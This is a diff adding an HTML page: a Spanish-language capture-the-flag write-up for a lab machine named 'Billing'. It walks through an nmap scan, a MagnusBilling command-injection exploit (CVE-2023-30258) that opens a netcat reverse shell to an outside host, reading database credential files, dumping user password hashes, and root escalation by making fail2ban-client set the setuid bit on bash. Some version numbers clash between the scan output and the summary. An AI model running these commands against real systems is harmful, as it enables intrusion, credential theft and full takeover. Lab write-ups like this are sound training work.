@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Billing - Flag Colector</title>
+    <link rel="stylesheet" href="../assets/writeup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="writeup-container">
+        <!-- Encabezado con metadatos -->
+        <div class="writeup-header">
+            <h1><i class="fas fa-skull"></i> Billing</h1>
+            <div class="machine-meta">
+                <span class="meta-item"><i class="fas fa-network-wired"></i> 10.10.203.95</span>
+                <span class="meta-item os linux"><i class="fab fa-linux"></i> Linux</span>
+                <span class="meta-item difficulty easy"><i class="fas fa-bolt"></i> Fácil</span>
+            </div>
+        </div>
+
+        <!-- Sección de Enumeración -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-search"></i> Enumeración</h2>
+            
+            <div class="finding">
+                <h3>Escaneo inicial</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo nmap -sC -sV -p- 10.10.203.95</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4>Resultado:</h4>
+                    <p>PORT STATE SERVICE VERSION<br><br>
+                        22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br><br>
+                        80/tcp   open  http     Apache httpd 2.4.56 ((Debian))<br><br>
+                        3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)<br><br>
+                        5038/tcp open  asterisk Asterisk Call Manager 2.10.6<br><br>
+                        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Características detectadas:</h4>
+                    <ul class="findings-list">
+                        <li>Puerto 22: Servidor OpenSSH (7.6p1)</li>
+                        <li>Puerto 80: Servidor Web Apache (2.4.29)</li>
+                        <li>Puerto 3306: Base de datos MariaDB (10.3.23)</li>
+                        <li>Puerto 5038: Gestor de llamadas Asterisk (2.10.6)</li>
+                    </ul>
+                </div>
+
+                <h3>Acceso al portal web (Puerto 80)</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>http://10.10.203.95/mbilling/</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto1.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 1: Acceso al portal web (Puerto 80)</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Veremos un panel de autenticación</p>
+                </div>
+
+                <h3>Análisis con Wappalyzer</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Con la extensión para navegadores llamada Wappalyzer identificaremos que utiliza el software MagnusBilling con ExtJS 6.2.0.981</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto2.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 2: Tecnologías encontradas con Wappalyzer</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Encontramos un panel de autenticación del software MagnusBilling, este utiliza ExtJS con versión 6.2.0.981</p>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Vulnerabilidad encontrada:</h4>
+                    <p>CVE-2023-30258 - Ejecución remota de código sin autenticación</p>
+                    <p>URL de referencia: https://attackerkb.com/topics/DFUJhaM5dL/cve-2023-30258</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Sección de Explotación -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-bug"></i> Explotación</h2>
+            
+            <div class="exploit-step">
+                <h3>Reverse Shell</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>En primer lugar pondremos un servicio a la escucha con Netcat en el puerto 443</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>nc -lvnp 443</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto3.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 3: Servicio a la escucha con Netcat (puerto 443)</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Esta vulnerabilidad se basa en poder establecer una shell reversa desde la URL:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>curl 'http://10.10.203.95/mbilling/lib/icepay/icepay.php?democ=iamhacked;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%2010.9.2.107%20443%20%3E%2Ftmp%2Ff;#'</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto4.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 4: Ejecución de la llamada a la Shell Reversa en la terminal de Kali Linux</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Con ello obtenemos una shell reversa como usuario asterisk</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto5.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 5: Recibimos acceso en el servicio a la escucha con Netcat</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>which id</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>/usr/bin/id</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto6.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 6: Comprobación de usuario en la Reverse Shell</p>
+                </div>
+
+                <h3>Enumeración de la base de datos</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Investigando el resto de directorios, encontraremos un fichero web que incluye la configuración de conexión con la base de datos:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat /var/www/html/mbilling/protected/config/main_production.php</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto7.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 7: El fichero main_production.php contiene una ruta con un fichero de configuración</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <p>Encontramos referencia al archivo de configuración MySQL:<br>
+                    /etc/asterisk/res_config_mysql.conf</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat /etc/asterisk/res_config_mysql.conf</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto8.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 8: Credenciales de acceso encontradas</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>mysql -u mbillingUser -p</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>show databases;</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>select username,password from pkg_user;</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto9.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 9: Investigación de la base de datos</p>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Intentamos crackear el hash encontrado pero sin éxito</h4>
+                </div>
+
+                <h3>User Flag</h3>
+
+                <div class="discovery-box-standard">
+                    <p>Enumerando desde el directorio home vewremos que existe el usuario Magnus,desde el cual logramos leer la flag
+                        de usuario:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cd /home/magnus</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat user.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto10.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 10: Tenemos al alcance la User Flag</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../Billing/img/foto11.png" alt="foto" class="writeup-image">
+                    <p class="image-caption">Figura 11: User Flag</p>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Sección de Escalada de Privilegios -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-user-shield"></i> Escalada de Privilegios</h2>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Vamos a listar el contenido del uuario Magnus</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>ls -la</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto12.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 12: Vemos el directorio .ssh</p>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto13.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 13: Permisos denegados sobre .ssh</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Vemos que existe el directorio .ssh, pero no tenemos permisos para leer la clave privadas</p>
+            </div>
+
+            <h3>Explotando fail2ban-client</h3>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Llegados a este punto vamos a intentar comprobar que permisos tenemos con el usuario Magnus</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo -l</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto14.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 14: Permisos de root sobre fail2ban-client</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Podremos ejecutar el servicio de fail2ban-client como root, por otro lado vemos que utiliza la versión de fail2ban-client 0.11.2</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo -u root /usr/bin/fail2ban-client version
+                </code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto15.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 15: Fail2ban-client version 0.11.2</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Se configurará entonces una acción en fail2ban-client para cambiar los permisos del binario bash. Luego, se ejecuta un baneo manual a una IP, 
+                    lo que dispara la acción y permite leer la flag de root.</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4>Configurar la acción en fail2ban para ejecutar el cambio de permisos privilegiados en bash:</h4>
+                <p></p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto16.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 16: Configuración de fail2ban-client para cambiar los permisos del binario bash</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4>Ejecutar el baneo manual de la IP para que active la acción configurada:</h4>
+                <p></p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo /usr/bin/fail2ban-client set asterisk-iptables banip 10.10.203.95</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto17.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 17: Configuración de fail2ban-client para bloqueo de IP</p>
+            </div>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>Devuelve 1 es decir, está activado</h4>
+            </div>
+
+            <div class="discovery-box-standard">
+                <p>Fail2ban modificará los permisos de /bin/bash y nos hará tener privilegios totales sobre dicha
+                    carpeta.Para verificar los permisos de /bin/bash para asegurarnos de que el bit setuid esté activado:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>ls -lna /bin/bash</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto18.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 18: Permisos modificados correctamente</p>
+            </div>
+
+            <h3>Root Flag</h3>
+
+            <div class="discovery-box-standard">
+                <p>Iniciaremos una nueva sesión de bash con privilegios:</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>bash -p</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto19.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 19: Acceso a nua nueva terminal de bash</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>whoami</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto20.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 20: Comprobación de privilegios</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cat /root/root.txt</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../Billing/img/foto21.png" alt="foto" class="writeup-image">
+                <p class="image-caption">Figura 21: Root Flag</p>
+            </div>
+
+        </section>
+    </div>
+
+    <script src="../../assets/scripts/copy.js" defer></script>
+</body>
+</html>
